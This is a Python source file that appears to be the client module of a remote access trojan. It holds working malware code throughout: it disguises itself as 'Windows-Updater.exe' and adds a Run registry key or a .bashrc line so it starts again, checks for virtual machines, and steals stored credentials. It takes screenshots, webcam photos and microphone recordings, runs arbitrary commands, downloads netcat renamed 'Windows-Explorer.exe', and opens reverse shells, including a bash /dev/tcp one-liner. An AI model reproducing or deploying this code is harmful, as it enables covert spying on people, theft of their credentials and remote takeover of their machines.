import os
import subprocess as sp
import requests
try:
    from cv2 import VideoCapture
    from cv2 import imwrite
except ImportError:
    pass

try:
    from scipy.io.wavfile import write
    from sounddevice import rec, wait
except ImportError:
    pass

import platform
import re
from urllib.request import Request, urlopen

try:
    import pyautogui
except Exception:
    pyautogui = None

from datetime import datetime
import shutil
import sys
import threading
import json
import ctypes
import random
import libraries.credentials as credentials

def get_home_dir():
    return os.path.expanduser("~")

def get_temp_dir():
    return os.environ.get("TEMP") or os.environ.get("TMP") or "/tmp"

def get_config_path():
    if platform.system() == "Windows":
        return os.path.join(get_home_dir(), ".config")
    else:
        return os.path.join(get_home_dir(), ".dystopia_config")


def autoPersistent():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if not os.path.exists(backdoor_location):
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)


def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    if platform.system() == "Windows":
        command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                           stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                           creationflags=0x08000000)
    else:
        command = sp.Popen("systemd-detect-virt", stderr=sp.PIPE,
                           stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    if not out.strip() == "none" and platform.system() != "Windows":
         # systemd-detect-virt returns "none" if not in VM
         return out.strip() != ""
    return False


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def getIP():
    try:
        IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
    except Exception:
        IP = "None"
    return IP


def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception:
        BITS = "None"
    return BITS


def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME


def getOS():
    try:
        OS = platform.platform()
    except Exception:
        OS = "None"
    return OS


def getCPU():
    try:
        CPU = platform.processor()
    except Exception:
        CPU = "None"
    return CPU


def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception:
        HOSTNAME = "None"
    return HOSTNAME


def createConfig():
    try:
        config_path = get_config_path()
        if not os.path.exists(config_path):
            os.mkdir(config_path)
            if platform.system() == "Windows":
                os.system(f"attrib +h {config_path}")
        
        uploads_path = os.path.join(config_path, "uploads")
        if not os.path.exists(uploads_path):
            os.mkdir(uploads_path)
        return True
    except Exception as e:
        print(f"Error creating config: {e}")
        return False
def id():
    path = os.path.join(get_config_path(), "ID")
    
    def createID(file):
        ID = file.read()
        if ID == "":
            ID = str(random.randint(1, 10000))
            file.write(ID)
        return ID
    try:    
        if not os.path.exists(path):
            with open(path, "w+") as f:
                pass
        with open(path, "r+") as IDfile:
            return createID(IDfile)

    except Exception as e:
        print(f"Error getting ID: {e}")
        return "None"



def cd(path):
    try:
        os.chdir(fr"{path}")
        return True
    except Exception as e:
        return e


def process():
    if platform.system() == "Windows":
        cmd_str = "tasklist"
        cf = 0x08000000
    else:
        cmd_str = "ps aux"
        cf = 0
    result = sp.Popen(cmd_str, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                      creationflags=cf)
    out, err = result.communicate()
    result.wait()
    return out



def upload(url, name):
    path = os.path.join(get_config_path(), "uploads")
    try:
        r = requests.get(url, allow_redirects=True, verify=False)
        with open(os.path.join(path, name), 'wb') as f:
            f.write(r.content)
        return True
    except Exception as e:
        return e



def screenshot():
    try:
        if pyautogui is None:
            return False
        Screenshot = pyautogui.screenshot()
        path = os.path.join(get_temp_dir(), "s.png")
        Screenshot.save(path)
        return path
    except Exception as e:
        print (e)
        return False


def webshot():
    try:
        cam = VideoCapture(0)
        ret, frame = cam.read()
        path = os.path.join(get_temp_dir(), "p.png")
        imwrite(path, frame)
        cam.release()
        return path
    except Exception as e:
        return False


def creds():  
    try:
        if platform.system() != "Windows":
             # Credentials stealing is Windows-specific in this project
             return False
        data = credentials.stealcreds()
        path = os.path.join(get_temp_dir(), "data.json")
        with open(path, 'w+') as outfile:
            json.dump(data, outfile, indent=4)
        return path
    except Exception:
        return False


def persistent():
    try:
        if platform.system() == "Windows":
            backdoor_location = os.path.join(os.environ.get("appdata", ""), "Windows-Updater.exe")
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                sp.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
                    shell=True)
                return True
            else:
                return "already-enabled"
        else:
            # Basic Linux persistence: add to .bashrc
            bashrc = os.path.expanduser("~/.bashrc")
            cmd = f'python3 {os.path.abspath(sys.argv[0])} &'
            with open(bashrc, "a") as f:
                f.write(f"\n{cmd}\n")
            return True
    except Exception as e:
        return e


def cmd(command):
    cf = 0x08000000 if platform.system() == "Windows" else 0
    result = sp.Popen(command, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,
                        text=True, creationflags=cf)
    out, err = result.communicate()
    result.wait()
    if not err:
        return out
    else:
        return err


def selfdestruct():
    try:
        config_location = get_config_path()
        if os.path.exists(config_location):
            shutil.rmtree(config_location)
            
        if platform.system() == "Windows":
            update_location = os.path.join(os.environ.get("appdata", ""), "Windows-Updater.exe")
            if os.path.exists(update_location):
                os.remove(update_location)
            sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
        else:
            # For Linux, we'd need to undo whatever persistence we added
            pass
        return True

    except Exception as e:
        return e


def location():
    try:
        response = requests.get("https://json.ipv4.myip.wtf")
        response.raise_for_status()
        return response
    except Exception:
        return False


def revshell(ip, port):
    def exec(IP, PORT):
        temp_dir = get_temp_dir()
        if platform.system() == "Windows":
            if not os.path.exists(os.path.join(temp_dir, 'Windows-Explorer.exe')):
                r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True,
                                        verify=False)
                with open(os.path.join(temp_dir, 'Windows-Explorer.exe'), 'wb') as f:
                    f.write(r.content)
            
            try:
                result = sp.Popen(f"{temp_dir}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b",
                                    stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                    creationflags=0x08000000)
                out, err = result.communicate()
                result.wait()
                return True
            except Exception:
                return False
        else:
            # Linux reverse shell
            try:
                sp.Popen(f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1", shell=True)
                return True
            except Exception:
                return False

    threading.Thread(target=exec, args=(ip, port)).start()
    return True


def recordmic(seconds):
    try:
        fs = 44100
        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
        wait()
        uploads_path = os.path.join(get_config_path(), "uploads")
        if not os.path.exists(uploads_path):
             os.makedirs(uploads_path)
        file_path = os.path.join(uploads_path, "recording.wav")
        write(file_path, fs, recording)
        return file_path
    except Exception as e:
        print(e)
        return False


def wallpaper(path):
    if path.startswith("http"):
        try:
            wallpaper_name = f"wallpaper.{path[-3:]}"
            r = requests.get(path, allow_redirects=True, verify=False)
            uploads_path = os.path.join(get_config_path(), "uploads")
            wallpaper_location = os.path.join(uploads_path, wallpaper_name)
            with open(wallpaper_location, 'wb') as f:
                f.write(r.content)
            
            if platform.system() == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
            else:
                # Linux wallpaper change depends on DE
                os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_location}")
            return True
        except Exception as e:
            return e
    else:
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            else:
                os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{path}")
            return True
        except Exception as e:
            return e


def killproc(pid):
    if platform.system() == "Windows":
        cmd_str = f"taskkill /F /PID {pid}"
        cf = 0x08000000
    else:
        cmd_str = f"kill -9 {pid}"
        cf = 0
    result = sp.Popen(cmd_str, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE,
                        shell=True, text=True, creationflags=cf)
    out, err = result.communicate()
    result.wait()
    if err:
        return err
    else:
        return True

